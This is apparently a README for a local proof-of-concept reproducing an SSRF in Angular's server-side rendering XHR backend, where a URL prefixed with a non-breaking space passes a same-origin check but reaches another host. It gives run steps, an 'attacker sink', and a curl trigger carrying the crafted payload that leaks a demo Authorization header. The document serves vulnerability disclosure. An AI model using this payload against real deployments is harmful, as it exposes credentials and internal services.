# Angular SSR ServerXhr URL parser discrepancy allows SSRF

Minimal local reproduction for `@angular/platform-server` using the XHR backend

The PoC shows a parser discrepancy between a WHATWG same-origin check and the URL later handled by `xhr2`. A URL prefixed with `U+00A0` is accepted as a same-origin path by the application, but the server request reaches a different loopback origin and keeps the demo `Authorization` header.

## Run

Install and build:

```bash
npm install
npm run build
```

Start the local attacker sink:

```bash
npm run attacker:serve
```

In another terminal, start Angular SSR:

```bash
npm run serve:ssr
```

Trigger the request:

```bash
curl "http://127.0.0.1:4000/?target=%C2%A0http%3A%2F%2F127.0.0.2%3A5000%2Fprobe"
```

Then inspect the captured request:

```text
http://127.0.0.2:5000/__events
```

Expected evidence includes a request to `127.0.0.2:5000` with the fake credential `Bearer AOT-LOCAL-DEMO-SECRET` and marker `AOT-SSRXHR-PARSER-POC`.
